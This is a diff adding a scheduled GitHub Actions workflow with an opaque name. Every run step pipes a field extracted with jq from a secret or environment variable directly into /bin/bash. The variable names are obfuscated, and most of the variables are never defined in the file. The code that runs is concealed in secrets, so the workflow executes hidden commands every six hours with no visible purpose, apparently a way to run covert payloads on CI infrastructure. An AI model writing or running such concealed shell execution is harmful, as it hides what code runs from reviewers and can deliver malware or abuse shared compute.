@@ -1,0 +1,25 @@
+name: hailonggongzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hailonggongzhi
+        env:
+          nvof299: ${{ secrets.nvof299 }}
+        run: |
+          echo $nvof299 | jq -r .llwss38 | /bin/bash
+          echo $dvs43 | jq -r .vfs4 | /bin/bash
+          echo $vlav821 | jq -r .lexf1209 | /bin/bash
+          echo $cvw7 | jq -r .kqqjd8 | /bin/bash
+          echo $s14 | jq -r .pem9 | /bin/bash
+          echo $xflb3 | jq -r .ha3263 | /bin/bash
+          echo $cxyp7 | jq -r .j75608 | /bin/bash
+          echo $ocj4433 | jq -r .xx3262 | /bin/bash
+          echo $fgd0 | jq -r .h1066 | /bin/bash
+
